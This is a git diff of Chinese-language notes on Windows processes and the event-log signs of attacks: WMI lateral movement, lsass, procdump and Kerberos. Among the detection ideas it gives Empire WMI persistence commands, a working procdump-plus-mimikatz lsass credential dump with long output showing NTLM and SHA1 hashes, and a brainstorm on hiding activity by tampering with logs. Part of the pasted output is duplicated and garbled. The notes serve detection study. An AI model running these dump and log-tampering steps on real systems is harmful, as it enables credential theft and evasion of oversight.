@@ -89,11 +89,43 @@ wmic /node：“ip” /user：user /password：password process call create “p
 event_id = 4688 AND 创建者进程名：C:\Windows\System32\wbem\WmicPrvSE.exe AND 进程命令行：cmd.exe /c whoami > 3.txt
 ```
 
+[https://www.freebuf.com/articles/system/182531.html
 
-[https://www.freebuf.com/articles/system/182531.html](https://www.freebuf.com/articles/system/182531.html)
+[](https://www.freebuf.com/articles/system/182531.html)
 
+## 横向移动-WMI
+
+WMI object -- class Win32_Process及其方法Create。Create方法允许用户在本地或远程创建一个进程。需要注意的是，当在远程系统上使用Create方法时，该方法是在一个名为 "Wmiprvse.exe "的主机进程下运行的。
+
+进程WmiprvSE.exe是spawn Create方法的CommandLine参数中定义的进程。因此，远程创建的新进程将以Wmiprvse.exe为父进程。WmiprvSE.exe是一个DCOM服务器，它是在DCOM服务主机svchost.exe下面产生的，参数如下C:\WINDOWS\system32/svchost.exe -k DcomLaunch -p。从登录会话的角度来看，在目标机上，WmiprvSE.exe是由DCOM服务主机在不同的登录会话中生成的。然而，无论WmiprvSE.exe执行的是什么，都会发生在从网络认证的用户创建的新的网络类型（3）登录会话上。
+
+攻击模拟：
+(Empire: XXX) > usemodule persistence/elevated/wmi*
+(Empire: powershell/persistence/elevated/wmi) > execute
+(Empire: XXX) > shell whoami
+
+检测思路：
+wmiprvse.exe产生（Spawn）新进程，这些进程是非系统账户会话的一部分。
+非系统账户利用WMI通过netwotk执行代码的情况。
+
+
+
+event_id = 4688 ，父进程wmiprvse.exe，子进程有cmd，powershell等。
+
+event_id = 4648，进程名称：c:\windows\syswow64\wbem\wmic.exe，网络地址不为-
+
+event_id = 4688 ，父进程%wmiprvse.exe，登陆ID !=0x3e7 
+
+
+
+对登陆ID的解释：
+
+系统帐户登录会话的logon ID始终为0x3e7（十进制999），网络服务会话的logon ID始终为0x3e4（996），本地服务的logon ID为0x3e5（997），大多数其他Logon ID是随机生成的。
+
+https://blog.51cto.com/jimshu/1331474
 
 # 3.vssadmin
+
 显示当前卷影副本备份和所有已安装的卷影副本编写器和提供程序。 选择下表中的命令名称，查看其命令语法。
 ```
 vssadmin list shadows 列出现有的卷影副本。
@@ -173,19 +205,14 @@ Windows计算机上的“隐藏” Kerberos票证
 
 # 10 lsass
 进程文件： lsass 或者[lsass.exe](https://baike.baidu.com/item/lsass.exe)
-进程名称： Local Security Authority Servicelsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。如果结束该进程，会出现不可知的错误。注意：lsass.exe也有可能是Windang.worm、irc.ratsou.b、Webus.B、MyDoom.L、Randex.AR、Nimos.worm等病毒创建的，病毒通过软盘、群发邮件和P2P文件共享进行传播。
+进程名称： Local Security Authority Service，lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于**本地安全和登陆策略****，该进程中存储着当前登录的明文密码。**如果结束该进程，会出现不可知的错误。
 
-NTLMSSP (NT LAN Manager Security Support Provider)，是微软提供的安全支持接口协议，常用于SMB共享。NtLmSsp（NT LM安全性支持提供者服务）的进程名是**lsass.exe**，WinXP Home/PRO默认安装的启动类型是手动，它不依赖于其他服务。
+注意：lsass.exe也有可能是Windang.worm、irc.ratsou.b、Webus.B、MyDoom.L、Randex.AR、Nimos.worm等病毒创建的，病毒通过软盘、群发邮件和P2P文件共享进行传播。
+
+**NTLMSSP (NT LAN Manager Security Support Provider)，是微软提供的安全支持接口协议，常用于SMB共享。NtLmSsp（NT LM安全性支持提供者服务）的进程名是**lsass.exe**，WinXP Home/PRO默认安装的启动类型是手动，它不依赖于其他服务。
 NT LM的意思即NT LanManger，是NT下提供的认证方法之一，使用了64位的加密手段。NtLmSsp这个服务主要针对RPC（远程过程调用），通常RPC可以选择基于两种通信方式，一种是传输协议，比如TCP/IP、UDP、IPX等，另一种为命名管道（Pipeline）。通常情况下Windows默认选择都是传输协议，而由于RPC是采用非加密传输的，通信数据安全无法得到保证，而NtLmSsp就可向这一类RPC提供安全服务。WinXP中已知的这类RPC应用就是Telnet服务（Telnet也依赖于NtLmSsp），因此无需Telnet服务的单机用户可将NtLmSsp其关闭。
 检索发现，较多ntlmssp相关的帖子都是描述说「有很多的审核失败的4625日志告警」，并且，对于其做一些安全策略的话（如下图），是可能导致服务器无法远程登陆的。
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/2566619/1611023260930-bfdf49a1-40fa-47eb-9eaa-dcd71f93377d.png#align=left&display=inline&height=545&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1090&originWidth=1582&size=1371916&status=done&style=none&width=791)
 
-
-
-
-
-
-spn信息收集 set-span？4769？/？？？
 # 11 msiexec.exe
 msiexec.exe，系统进程，是Windows Installer的一部分。用于安装**Windows Installer安装包（MSI）**，对系统的正常运行是非常重要的，一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大。
 
@@ -206,15 +233,6 @@ wuauclt.exe- wuauclt -进程管理信息进程文件： wuauclt or wuauclt.exe
 Wuauclt.exe是Windows自动升级管理程序。该进程会不断在线检测更新。删除该进程将使计算机无法得到最新更新信息。
 
 wuauclt.exe wsus windows server update service 
-conhost.exe
-ntlmssp
-
-
-cut -d ' ' -f 1,12 filename |grep 'error.html' | cut -d ' ' -f 1 |sort |uniq -c |sort -nr|head -n 10
-
-
-18454 ---登陆成功。
-event_id ='18453' or event_id ='18454' or event_id ='18456' 
 
 # 14 wininit.exe
 
@@ -226,4 +244,437 @@ wininit.exe的工作是开启一些主要的Vista-Win7、Win8后台服务，比�
 
 **wininit.exe的错误样例**："Wininit.exe Cannot Be Run from Within Windows."如果你的系统被病毒感染，你将收到这一段信息。 Viruses Win32.Weird 和Bymer是已知的wininit.exe相关的病毒。
 
-ime input me
+ime input method editor
+
+# 15 procdump 
+
+ProcDump 是一个命令行的实用工具，其主要目的是**监测应用程序**如何**使 CPU 达到峰值（spike）以及生成崩溃转储（crash dumps）**，管理员或开发人员可以利用这个工具确定造成 CPU 达到峰值的原因。
+
+dmp文件：dmp是系统错误产生的文件
+
+原理： lsass.exe 进程 (它用于本地安全和登陆策略) 中存储的明文登录密码。
+
+示例：![image-20210209160652926](../image/image-20210209160652926.png)
+
+*读取操作实验
+
+1.使用systeminternal的工具procdump，或者手工找到进程lsass.exe，右键转存。
+
+```
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+2.使用mimikatz读取dmp文件内容
+
+```
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+或
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+```
+
+这里使用win10测试，发现password那里显示是null，但是拿ntlm解密是可以接到的（弱密码）
+
+```
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::minidump lsass-1.dmp
+Switch to MINIDUMP : 'lsass-1.dmp'
+
+mimikatz(commandline) # sekurlsa::logonPasswords full
+Opening : 'lsass-1.dmp' file for minidump...
+
+Authentication Id : 0 ; 229404 (00000000:0003801c)
+Session           : Interactive from 1
+User Name         : Test
+Domain            : DESKTOP-G3FNP4K
+Logon Server      : DESKTOP-G3FNP4K
+Logon Time        : 2021/2/10 14:43:46
+SID               : S-1-5-21-651588814-643419694-3333898981-1000
+        msv :
+         [00000003] Primary
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+         [00010000] CredentialKeys
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+        tspkg :
+        wdigest :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        kerberos :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 229360 (00000000:00037ff0)
+Session           : Interactive from 1
+User Name         : Test
+Domain            : DESKTOP-G3FNP4K
+Logon Server      : DESKTOP-G3FNP4K
+Logon Time        : 2021/2/10 14:43:46
+SID               : S-1-5-21-651588814-643419694-3333898981-1000
+        msv :
+         [00010000] CredentialKeys
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+         [00000003] Primary
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+        tspkg :
+        wdigest :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        kerberos :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64907 (00000000:0000fd8b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64849 (00000000:0000fd51)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-G3FNP4K$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : desktop-g3fnp4k$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 38615 (00000000:000096d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:48
+SID               :
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-G3FNP4K$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:48
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : desktop-g3fnp4k$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::minidump lsass-1.dmp
+Switch to MINIDUMP : 'lsass-1.dmp'
+
+mimikatz(commandline) # sekurlsa::logonPasswords full
+Opening : 'lsass-1.dmp' file for minidump...
+
+Authentication Id : 0 ; 229404 (00000000:0003801c)
+Session           : Interactive from 1
+User Name         : Test
+Domain            : DESKTOP-G3FNP4K
+Logon Server      : DESKTOP-G3FNP4K
+Logon Time        : 2021/2/10 14:43:46
+SID               : S-1-5-21-651588814-643419694-3333898981-1000
+        msv :
+         [00000003] Primary
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+         [00010000] CredentialKeys
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+        tspkg :
+        wdigest :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        kerberos :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 229360 (00000000:00037ff0)
+Session           : Interactive from 1
+User Name         : Test
+Domain            : DESKTOP-G3FNP4K
+Logon Server      : DESKTOP-G3FNP4K
+Logon Time        : 2021/2/10 14:43:46
+SID               : S-1-5-21-651588814-643419694-3333898981-1000
+        msv :
+         [00010000] CredentialKeys
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+         [00000003] Primary
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * NTLM     : c5a237b7e9d8e708d8436b6148a25fa1
+         * SHA1     : 39cfdb69532cff3336f08a83aac42524f41cd6e9
+        tspkg :
+        wdigest :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        kerberos :
+         * Username : Test
+         * Domain   : DESKTOP-G3FNP4K
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64907 (00000000:0000fd8b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64849 (00000000:0000fd51)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-G3FNP4K$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:49
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-G3FNP4K$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : desktop-g3fnp4k$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 38615 (00000000:000096d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:48
+SID               :
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-G3FNP4K$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/2/10 14:42:48
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+
+   * Username : DESKTOP-G3FNP4K$
+     ain   : WORKGROUP
+        * Password : (null)
+          ros :
+             * Username : desktop-g3fnp4k$
+               ain   : WORKGROUP
+                  * Password : (null)
+                    ​        credman :
+mimikatz(commandline) # exit
+Bye!
+```
+
+![image-20210210151525203](../image/image-20210210151525203.png)
+
+![image-20210210151311075](../image/image-20210210151311075.png)
+
+
+
+# 16 TGT  Ticket Granting Ticket 票证授权票证
+
+**Kerberos是一种网络身份验证协议。****它旨在通过使用秘密密钥加密为客户端/服务器应用程序提供强身份验证。**
+
+#### %% 奇思妙想，和同事讨论，隐藏攻击行为的方法：
+
+1.覆盖日志（行为覆盖，属性中可看到覆盖的设置）；但我认为该行为操作难度过大。。
+
+2.删除某条日志；不可行
+
+3.使用其他日志文件覆盖日志，无法停止服务，然后文件名无法重命名 为一样的，拖进去也无法覆盖，失败。
+
+# WAITING PROGRAMS ......
+
+conhost.exe
+ntlmssp
+
+
+cut -d ' ' -f 1,12 filename |grep 'error.html' | cut -d ' ' -f 1 |sort |uniq -c |sort -nr|head -n 10
+
+18454 ---登陆成功。
+event_id ='18453' or event_id ='18454' or event_id ='18456' 
+
+spn信息收集 set-span？4769？/？？？
+
+auditpol /get 
+
+修改审核策略
+
+![image-20210210150615340](C:\Users\Foe0\AppData\Roaming\Typora\typora-user-images\image-20210210150615340.png)
